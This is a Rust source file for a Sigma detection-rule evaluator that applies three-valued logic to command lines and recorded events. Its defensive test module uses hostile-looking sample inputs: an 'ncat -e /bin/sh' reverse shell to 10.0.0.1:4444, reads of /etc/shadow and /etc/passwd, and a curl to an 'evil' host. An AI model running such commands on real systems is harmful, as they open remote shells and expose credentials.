//! Sigma rule-logic evaluator.
//!
//! Evaluates a parsed command against a Sigma rule's actual
//! `detection:`/`condition:` logic, with three-valued (Kleene) logic:
//! `FIRES` / `NO-FIRE` / `INDETERMINATE`. The command is a *command line*, not a
//! full host event, so we synthesize the fields we can legitimately know
//! (`CommandLine`, `Image`, `OriginalFileName`); a rule keyed on a field we
//! cannot see (e.g. `ParentImage`, a hash, a registry value) evaluates to
//! `INDETERMINATE` rather than a false claim. See
//! `docs/design/rule-logic-evaluator.md`.
//!
//! When the input is *recorded* telemetry rather than a command line, the real
//! event carries those extra fields; [`evaluate_observed`] overlays them onto
//! the synthesized base, so a rule keyed on `ParentImage` / `User` /
//! `IntegrityLevel` resolves to `FIRES` / `NO-FIRE` instead of `INDETERMINATE`.

use std::collections::{HashMap, HashSet};

use serde::{Deserialize, Serialize};
use serde_yaml::Value;

use crate::kb::Platform;
use crate::parser::Command;

/// Kleene three-valued truth.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Ternary {
    True,
    False,
    Unknown,
}

fn and_all<I: IntoIterator<Item = Ternary>>(it: I) -> Ternary {
    let mut unknown = false;
    for t in it {
        match t {
            Ternary::False => return Ternary::False,
            Ternary::Unknown => unknown = true,
            Ternary::True => {}
        }
    }
    if unknown {
        Ternary::Unknown
    } else {
        Ternary::True
    }
}

fn or_all<I: IntoIterator<Item = Ternary>>(it: I) -> Ternary {
    let mut unknown = false;
    for t in it {
        match t {
            Ternary::True => return Ternary::True,
            Ternary::Unknown => unknown = true,
            Ternary::False => {}
        }
    }
    if unknown {
        Ternary::Unknown
    } else {
        Ternary::False
    }
}

fn not_(t: Ternary) -> Ternary {
    match t {
        Ternary::True => Ternary::False,
        Ternary::False => Ternary::True,
        Ternary::Unknown => Ternary::Unknown,
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
enum Modifier {
    Contains,
    StartsWith,
    EndsWith,
    All,
}

/// A `field|mods: values` match.
///
/// Two distinct things make a match unevaluable, and they are recorded
/// separately so a caller can tell them apart: a modifier we don't implement
/// yet (`re`, `cidr`, `base64`, `windash`, …), and an empty value list — Sigma's
/// field-absent (`null`) semantics. Both evaluate to `Unknown`, but only the
/// first is work we could do.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct FieldMatch {
    field: String,
    mods: Vec<Modifier>,
    values: Vec<String>,
    /// Modifier tokens as written in the rule, for the ones we cannot evaluate.
    #[serde(default)]
    unsupported_mods: Vec<String>,
    /// `field|…: null` — the rule asserts the field is absent.
    #[serde(default)]
    null_values: bool,
}

impl FieldMatch {
    fn supported(&self) -> bool {
        self.unsupported_mods.is_empty() && !self.null_values
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
enum Search {
    Fields(Vec<FieldMatch>),
    OneOfMaps(Vec<Vec<FieldMatch>>),
    Keywords(Vec<String>),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
enum Cond {
    Id(String),
    And(Box<Cond>, Box<Cond>),
    Or(Box<Cond>, Box<Cond>),
    Not(Box<Cond>),
    /// `N of <pattern>` (`n = Some(k)`) or `all of <pattern>` (`n = None`).
    Quant {
        n: Option<usize>,
        pat: String,
    },
}

/// A parsed Sigma rule reduced to what the evaluator needs.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionRule {
    pub id: String,
    pub title: String,
    searches: HashMap<String, Search>,
    condition: Cond,
}

/// The verdict of evaluating a rule against a command.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Outcome {
    Fires,
    NoFire,
    Indeterminate,
}

#[derive(Debug, Clone)]
pub struct Verdict {
    pub outcome: Outcome,
    /// For `Indeterminate`: referenced fields opseclint cannot synthesize.
    pub missing_fields: Vec<String>,
    /// For `Indeterminate`: modifier tokens the evaluator does not implement
    /// (`re`, `base64offset`, `windash`, …), sorted and deduplicated.
    ///
    /// This and `missing_fields` are the two *actionable* causes of abstention
    /// and they are very different work: one is evaluator features, the other is
    /// telemetry the tool would have to be given. Reporting them apart is what
    /// makes the indeterminate count diagnosable rather than just large.
    pub blocking_modifiers: Vec<String>,
    /// For `Indeterminate`: the rule asserts a field is absent (`field: null`).
    /// Abstaining is arguably correct here, so this is tracked separately from
    /// the two causes above rather than counted alongside them.
    pub null_value_match: bool,
}

// --- parsing ---------------------------------------------------------------

fn value_to_string(v: &Value) -> Option<String> {
    match v {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

fn parse_field_match(key: &str, val: &Value) -> FieldMatch {
    let mut parts = key.split('|');
    let field = parts.next().unwrap_or("").to_string();
    let mut mods = Vec::new();
    let mut unsupported_mods = Vec::new();
    for m in parts {
        match m {
            "contains" => mods.push(Modifier::Contains),
            "startswith" => mods.push(Modifier::StartsWith),
            "endswith" => mods.push(Modifier::EndsWith),
            "all" => mods.push(Modifier::All),
            // re, cidr, base64, base64offset, windash, lt/gt, … Recorded by name
            // so `--verify-detections` can report which ones are actually
            // costing coverage, rather than just that something was unknown.
            other => unsupported_mods.push(other.to_string()),
        }
    }
    let values: Vec<String> = match val {
        Value::Sequence(seq) => seq.iter().filter_map(value_to_string).collect(),
        other => value_to_string(other).into_iter().collect(),
    };
    let null_values = values.is_empty();
    FieldMatch {
        field,
        mods,
        values,
        unsupported_mods,
        null_values,
    }
}

fn parse_fields_map(m: &serde_yaml::Mapping) -> Vec<FieldMatch> {
    m.iter()
        .filter_map(|(k, v)| k.as_str().map(|key| parse_field_match(key, v)))
        .collect()
}

fn parse_search(v: &Value) -> Option<Search> {
    match v {
        Value::Mapping(m) => Some(Search::Fields(parse_fields_map(m))),
        Value::Sequence(seq) => {
            if !seq.is_empty() && seq.iter().all(|x| x.is_mapping()) {
                let groups = seq
                    .iter()
                    .filter_map(|item| item.as_mapping().map(parse_fields_map))
                    .collect();
                Some(Search::OneOfMaps(groups))
            } else {
                Some(Search::Keywords(
                    seq.iter().filter_map(value_to_string).collect(),
                ))
            }
        }
        _ => None,
    }
}

/// Parse a Sigma rule (YAML text) into a [`DetectionRule`]. Returns `None` if
/// the rule has no usable `detection`/`condition` (it is then simply skipped by
/// callers rather than mis-evaluated).
pub fn parse_rule(yaml: &str) -> Option<DetectionRule> {
    let doc: Value = serde_yaml::from_str(yaml).ok()?;
    parse_rule_value(&doc)
}

/// Parse an already-deserialized Sigma rule document into a [`DetectionRule`].
pub fn parse_rule_value(doc: &Value) -> Option<DetectionRule> {
    let det = doc.get("detection")?.as_mapping()?;

    let mut searches = HashMap::new();
    let mut condition = None;
    for (k, v) in det {
        let key = k.as_str()?;
        if key == "condition" {
            condition = Some(parse_condition(v.as_str()?)?);
        } else if let Some(s) = parse_search(v) {
            searches.insert(key.to_string(), s);
        }
    }

    Some(DetectionRule {
        id: doc
            .get("id")
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_string(),
        title: doc
            .get("title")
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_string(),
        searches,
        condition: condition?,
    })
}

fn parse_condition(s: &str) -> Option<Cond> {
    let spaced = s.replace('(', " ( ").replace(')', " ) ");
    let toks: Vec<String> = spaced.split_whitespace().map(str::to_string).collect();
    let mut p = CondParser { toks, pos: 0 };
    let cond = p.parse_or()?;
    if p.pos == p.toks.len() {
        Some(cond)
    } else {
        None
    }
}

struct CondParser {
    toks: Vec<String>,
    pos: usize,
}

impl CondParser {
    fn peek(&self) -> Option<&str> {
        self.toks.get(self.pos).map(String::as_str)
    }
    fn next(&mut self) -> Option<String> {
        let t = self.toks.get(self.pos).cloned();
        if t.is_some() {
            self.pos += 1;
        }
        t
    }

    fn parse_or(&mut self) -> Option<Cond> {
        let mut left = self.parse_and()?;
        while self.peek() == Some("or") {
            self.next();
            let right = self.parse_and()?;
            left = Cond::Or(Box::new(left), Box::new(right));
        }
        Some(left)
    }

    fn parse_and(&mut self) -> Option<Cond> {
        let mut left = self.parse_not()?;
        while self.peek() == Some("and") {
            self.next();
            let right = self.parse_not()?;
            left = Cond::And(Box::new(left), Box::new(right));
        }
        Some(left)
    }

    fn parse_not(&mut self) -> Option<Cond> {
        if self.peek() == Some("not") {
            self.next();
            Some(Cond::Not(Box::new(self.parse_not()?)))
        } else {
            self.parse_primary()
        }
    }

    fn parse_primary(&mut self) -> Option<Cond> {
        match self.peek()? {
            "(" => {
                self.next();
                let inner = self.parse_or()?;
                if self.next().as_deref() != Some(")") {
                    return None;
                }
                Some(inner)
            }
            "all" => {
                self.next();
                self.parse_quant(None)
            }
            tok if tok.chars().all(|c| c.is_ascii_digit()) => {
                let n: usize = self.next()?.parse().ok()?;
                self.parse_quant(Some(n))
            }
            _ => Some(Cond::Id(self.next()?)),
        }
    }

    fn parse_quant(&mut self, n: Option<usize>) -> Option<Cond> {
        if self.next().as_deref() != Some("of") {
            return None;
        }
        let pat = self.next()?;
        Some(Cond::Quant { n, pat })
    }
}

// --- evaluation ------------------------------------------------------------

/// Simple glob matcher supporting `*` and `?` (inputs pre-lowercased).
fn glob_match(text: &str, pat: &str) -> bool {
    let t: Vec<char> = text.chars().collect();
    let p: Vec<char> = pat.chars().collect();
    let (mut i, mut j) = (0usize, 0usize);
    let (mut star, mut mark) = (None, 0usize);
    while i < t.len() {
        if j < p.len() && (p[j] == '?' || p[j] == t[i]) {
            i += 1;
            j += 1;
        } else if j < p.len() && p[j] == '*' {
            star = Some(j);
            mark = i;
            j += 1;
        } else if let Some(s) = star {
            j = s + 1;
            mark += 1;
            i = mark;
        } else {
            return false;
        }
    }
    while j < p.len() && p[j] == '*' {
        j += 1;
    }
    j == p.len()
}

fn synthesize(cmd: &Command, platform: Platform) -> HashMap<String, String> {
    let mut m = HashMap::new();
    m.insert("CommandLine".to_string(), cmd.raw.clone());
    let image = match platform {
        Platform::WindowsSysmon => format!("\\{}.exe", cmd.program),
        _ => format!("/{}", cmd.program),
    };
    m.insert("Image".to_string(), image);
    m.insert("OriginalFileName".to_string(), cmd.program.clone());
    m
}

fn eval_field(fm: &FieldMatch, event: &HashMap<String, String>) -> Ternary {
    if !fm.supported() {
        return Ternary::Unknown;
    }
    let Some(raw) = event.get(&fm.field) else {
        return Ternary::Unknown;
    };
    let val = raw.to_lowercase();
    let hit = |needle: &str| {
        let n = needle.to_lowercase();
        if fm.mods.contains(&Modifier::Contains) {
            val.contains(&n)
        } else if fm.mods.contains(&Modifier::StartsWith) {
            val.starts_with(&n)
        } else if fm.mods.contains(&Modifier::EndsWith) {
            val.ends_with(&n)
        } else {
            glob_match(&val, &n)
        }
    };
    let matched = if fm.mods.contains(&Modifier::All) {
        fm.values.iter().all(|v| hit(v))
    } else {
        fm.values.iter().any(|v| hit(v))
    };
    if matched {
        Ternary::True
    } else {
        Ternary::False
    }
}

fn eval_search(s: &Search, event: &HashMap<String, String>) -> Ternary {
    match s {
        Search::Fields(fms) => and_all(fms.iter().map(|f| eval_field(f, event))),
        Search::OneOfMaps(groups) => or_all(
            groups
                .iter()
                .map(|g| and_all(g.iter().map(|f| eval_field(f, event)))),
        ),
        Search::Keywords(kws) => match event.get("CommandLine") {
            Some(cl) => {
                let cl = cl.to_lowercase();
                if kws.iter().any(|k| cl.contains(&k.to_lowercase())) {
                    Ternary::True
                } else {
                    Ternary::False
                }
            }
            None => Ternary::Unknown,
        },
    }
}

fn matching_ids<'a>(pat: &str, searches: &'a HashMap<String, Search>) -> Vec<&'a str> {
    if pat == "them" {
        searches.keys().map(String::as_str).collect()
    } else if let Some(prefix) = pat.strip_suffix('*') {
        searches
            .keys()
            .filter(|k| k.starts_with(prefix))
            .map(String::as_str)
            .collect()
    } else {
        searches
            .keys()
            .filter(|k| k.as_str() == pat)
            .map(String::as_str)
            .collect()
    }
}

fn eval_cond(
    cond: &Cond,
    searches: &HashMap<String, Search>,
    event: &HashMap<String, String>,
) -> Ternary {
    match cond {
        Cond::Id(name) => searches
            .get(name)
            .map(|s| eval_search(s, event))
            .unwrap_or(Ternary::Unknown),
        Cond::Not(c) => not_(eval_cond(c, searches, event)),
        Cond::And(a, b) => and_all([eval_cond(a, searches, event), eval_cond(b, searches, event)]),
        Cond::Or(a, b) => or_all([eval_cond(a, searches, event), eval_cond(b, searches, event)]),
        Cond::Quant { n, pat } => {
            let terns: Vec<Ternary> = matching_ids(pat, searches)
                .iter()
                .filter_map(|id| searches.get(*id))
                .map(|s| eval_search(s, event))
                .collect();
            match n {
                None => and_all(terns),
                Some(k) => {
                    let t = terns.iter().filter(|x| **x == Ternary::True).count();
                    let u = terns.iter().filter(|x| **x == Ternary::Unknown).count();
                    if t >= *k {
                        Ternary::True
                    } else if t + u >= *k {
                        Ternary::Unknown
                    } else {
                        Ternary::False
                    }
                }
            }
        }
    }
}

fn collect_fields(s: &Search, out: &mut HashSet<String>) {
    match s {
        Search::Fields(fms) => out.extend(fms.iter().map(|f| f.field.clone())),
        Search::OneOfMaps(groups) => {
            for g in groups {
                out.extend(g.iter().map(|f| f.field.clone()));
            }
        }
        Search::Keywords(_) => {
            out.insert("CommandLine".to_string());
        }
    }
}

fn referenced_fields(rule: &DetectionRule) -> HashSet<String> {
    let mut out = HashSet::new();
    for s in rule.searches.values() {
        collect_fields(s, &mut out);
    }
    out
}

fn collect_unsupported(s: &Search, mods: &mut HashSet<String>, null_values: &mut bool) {
    let mut scan = |fms: &[FieldMatch]| {
        for f in fms {
            mods.extend(f.unsupported_mods.iter().cloned());
            *null_values |= f.null_values;
        }
    };
    match s {
        Search::Fields(fms) => scan(fms),
        Search::OneOfMaps(groups) => groups.iter().for_each(|g| scan(g)),
        Search::Keywords(_) => {}
    }
}

/// Modifiers the rule uses that this evaluator does not implement, and whether
/// it asserts a field is absent. Same semantics as [`referenced_fields`]: these
/// are *present in the rule*, not proven to be the branch that forced `Unknown`.
fn unsupported_features(rule: &DetectionRule) -> (Vec<String>, bool) {
    let mut mods = HashSet::new();
    let mut null_values = false;
    for s in rule.searches.values() {
        collect_unsupported(s, &mut mods, &mut null_values);
    }
    let mut mods: Vec<String> = mods.into_iter().collect();
    mods.sort();
    (mods, null_values)
}

/// Evaluate a rule against a command using only the fields synthesizable from a
/// command line (`CommandLine` / `Image` / `OriginalFileName`) — predictive
/// mode. A rule keyed on a field a static command line cannot supply (a parent,
/// a user, an integrity level, a hash) evaluates to `Indeterminate`.
pub fn evaluate(rule: &DetectionRule, cmd: &Command, platform: Platform) -> Verdict {
    eval_event(rule, &synthesize(cmd, platform))
}

/// Evaluate a rule against a *real recorded* event: the synthesized base
/// extended and overridden by the fields a sensor actually logged. Because the
/// real event supplies the context a command line alone cannot — `ParentImage`,
/// `User`, `IntegrityLevel`, … — verdicts that are `Indeterminate` in predictive
/// mode resolve to `Fires` / `NoFire` here. `observed` keys must be the
/// canonical field names a Sigma rule references (e.g. `ParentImage`); empty
/// values are ignored so a blank field cannot mask the synthesized fallback.
pub fn evaluate_observed(
    rule: &DetectionRule,
    cmd: &Command,
    platform: Platform,
    observed: &HashMap<String, String>,
) -> Verdict {
    let mut event = synthesize(cmd, platform);
    for (k, v) in observed {
        if !v.is_empty() {
            event.insert(k.clone(), v.clone());
        }
    }
    eval_event(rule, &event)
}

/// Evaluate a rule's condition against a fully-built event, reporting the fields
/// it referenced but the event did not carry when the verdict is indeterminate.
fn eval_event(rule: &DetectionRule, event: &HashMap<String, String>) -> Verdict {
    let outcome = match eval_cond(&rule.condition, &rule.searches, event) {
        Ternary::True => Outcome::Fires,
        Ternary::False => Outcome::NoFire,
        Ternary::Unknown => Outcome::Indeterminate,
    };
    if outcome != Outcome::Indeterminate {
        return Verdict {
            outcome,
            missing_fields: Vec::new(),
            blocking_modifiers: Vec::new(),
            null_value_match: false,
        };
    }
    let mut missing_fields: Vec<String> = referenced_fields(rule)
        .into_iter()
        .filter(|f| !f.is_empty() && !event.contains_key(f))
        .collect();
    missing_fields.sort();
    let (blocking_modifiers, null_value_match) = unsupported_features(rule);
    Verdict {
        outcome,
        missing_fields,
        blocking_modifiers,
        null_value_match,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::parse_line;

    fn cmd(s: &str) -> Command {
        parse_line(s).into_iter().next().expect("a command")
    }

    fn verdict(yaml: &str, command: &str) -> Verdict {
        let rule = parse_rule(yaml).expect("rule parses");
        evaluate(&rule, &cmd(command), Platform::LinuxAuditd)
    }

    const SHADOW: &str = r#"
title: Shadow read
id: r1
detection:
    selection:
        CommandLine|contains: '/etc/shadow'
    condition: selection
"#;

    const PARENT: &str = r#"
title: Whoami under sshd
id: r2
detection:
    selection:
        ParentImage|endswith: '/sshd'
        CommandLine|contains: 'whoami'
    condition: selection
"#;

    const FILTER: &str = r#"
title: Curl not apt
id: r3
detection:
    selection:
        CommandLine|contains: 'curl'
    filter:
        CommandLine|contains: 'apt'
    condition: selection and not filter
"#;

    const ONEOF: &str = r#"
title: Netcat
id: r4
detection:
    selection_nc:
        CommandLine|contains: 'nc '
    selection_ncat:
        CommandLine|contains: 'ncat'
    condition: 1 of selection_*
"#;

    #[test]
    fn fires_on_direct_match() {
        assert_eq!(verdict(SHADOW, "cat /etc/shadow").outcome, Outcome::Fires);
    }

    #[test]
    fn indeterminate_when_field_unavailable() {
        let v = verdict(PARENT, "whoami");
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert!(v.missing_fields.iter().any(|f| f == "ParentImage"));
    }

    #[test]
    fn no_fire_when_filter_excludes() {
        assert_eq!(
            verdict(FILTER, "curl http://apt/x").outcome,
            Outcome::NoFire
        );
        // …but without the filter term it fires.
        assert_eq!(
            verdict(FILTER, "curl http://evil/x").outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn one_of_pattern() {
        assert_eq!(
            verdict(ONEOF, "ncat -e /bin/sh 10.0.0.1 4444").outcome,
            Outcome::Fires
        );
        assert_eq!(verdict(ONEOF, "ls -la").outcome, Outcome::NoFire);
    }

    #[test]
    fn unsupported_modifier_is_indeterminate() {
        let yaml = "title: t\nid: r5\ndetection:\n    selection:\n        CommandLine|re: '.*shadow.*'\n    condition: selection\n";
        assert_eq!(
            verdict(yaml, "cat /etc/shadow").outcome,
            Outcome::Indeterminate
        );
    }

    /// The two actionable causes of abstention must be distinguishable: an
    /// unimplemented modifier is evaluator work, a missing field is telemetry
    /// the tool would have to be handed. Collapsing them makes the
    /// indeterminate count undiagnosable.
    #[test]
    fn modifier_block_is_reported_and_distinct_from_a_missing_field() {
        let by_modifier = verdict(
            "title: t\nid: m1\ndetection:\n    selection:\n        CommandLine|re: '.*shadow.*'\n    condition: selection\n",
            "cat /etc/shadow",
        );
        assert_eq!(by_modifier.outcome, Outcome::Indeterminate);
        assert_eq!(by_modifier.blocking_modifiers, vec!["re".to_string()]);
        // CommandLine *is* synthesizable, so nothing is missing — only the
        // modifier is in the way.
        assert!(by_modifier.missing_fields.is_empty());

        // The mirror case: a field a command line cannot supply, no exotic
        // modifier anywhere.
        let by_field = verdict(PARENT, "whoami");
        assert_eq!(by_field.outcome, Outcome::Indeterminate);
        assert!(by_field.blocking_modifiers.is_empty());
        assert_eq!(by_field.missing_fields, vec!["ParentImage".to_string()]);
    }

    #[test]
    fn every_unsupported_modifier_in_a_rule_is_named() {
        // Chained modifiers: `base64offset` is unimplemented, `contains` is not.
        // Only the unimplemented one should be reported, and the chain must not
        // hide it behind the one we do support.
        let v = verdict(
            "title: t\nid: m2\ndetection:\n    selection:\n        CommandLine|base64offset|contains: 'whoami'\n        Image|windash: '-enc'\n    condition: selection\n",
            "cat /etc/shadow",
        );
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert_eq!(
            v.blocking_modifiers,
            vec!["base64offset".to_string(), "windash".to_string()],
            "sorted, deduplicated, and excluding the supported `contains`"
        );
    }

    #[test]
    fn field_absent_semantics_are_tracked_apart_from_modifiers() {
        // `field: null` asserts absence. Abstaining is defensible, so it must
        // not inflate the modifier bucket that drives implementation priority.
        let v = verdict(
            "title: t\nid: m3\ndetection:\n    selection:\n        ParentImage: null\n    condition: selection\n",
            "whoami",
        );
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert!(v.null_value_match);
        assert!(v.blocking_modifiers.is_empty());
    }

    #[test]
    fn a_resolved_verdict_reports_no_causes() {
        let fires = verdict(SHADOW, "cat /etc/shadow");
        assert_eq!(fires.outcome, Outcome::Fires);
        assert!(fires.blocking_modifiers.is_empty());
        assert!(fires.missing_fields.is_empty());
        assert!(!fires.null_value_match);
    }

    #[test]
    fn wildcard_value_matches() {
        let yaml = "title: t\nid: r6\ndetection:\n    selection:\n        Image: '*/cat'\n    condition: selection\n";
        assert_eq!(verdict(yaml, "cat /etc/passwd").outcome, Outcome::Fires);
    }

    #[test]
    fn observed_parent_field_resolves_indeterminate_to_fires() {
        // PARENT keys on ParentImage, which a command line cannot supply, so
        // predictive evaluation is indeterminate…
        let rule = parse_rule(PARENT).unwrap();
        let c = cmd("whoami");
        let pred = evaluate(&rule, &c, Platform::LinuxAuditd);
        assert_eq!(pred.outcome, Outcome::Indeterminate);
        assert!(pred.missing_fields.iter().any(|f| f == "ParentImage"));

        // …but a recorded event carrying the real ParentImage fires the rule,
        // with nothing left missing.
        let mut observed = HashMap::new();
        observed.insert("ParentImage".to_string(), "/usr/sbin/sshd".to_string());
        let obs = evaluate_observed(&rule, &c, Platform::LinuxAuditd, &observed);
        assert_eq!(obs.outcome, Outcome::Fires);
        assert!(obs.missing_fields.is_empty());
    }

    #[test]
    fn observed_parent_field_can_also_exclude_a_fire() {
        // A recorded parent that does not match turns the same indeterminate
        // into a definite no-fire — the point of consulting the real event.
        let rule = parse_rule(PARENT).unwrap();
        let c = cmd("whoami");
        let mut observed = HashMap::new();
        observed.insert("ParentImage".to_string(), "/usr/bin/bash".to_string());
        assert_eq!(
            evaluate_observed(&rule, &c, Platform::LinuxAuditd, &observed).outcome,
            Outcome::NoFire
        );
    }

    #[test]
    fn empty_observed_value_does_not_mask_the_synthesized_base() {
        // A blank observed field is ignored, leaving the synthesized fallback —
        // a direct CommandLine match still fires.
        let rule = parse_rule(SHADOW).unwrap();
        let c = cmd("cat /etc/shadow");
        let mut observed = HashMap::new();
        observed.insert("CommandLine".to_string(), String::new());
        assert_eq!(
            evaluate_observed(&rule, &c, Platform::LinuxAuditd, &observed).outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn condition_parser_handles_parens_and_not() {
        let rule = parse_rule(FILTER).unwrap();
        // `selection and not filter` parsed into And(Id, Not(Id))
        assert!(matches!(rule.condition, Cond::And(_, _)));
    }
}
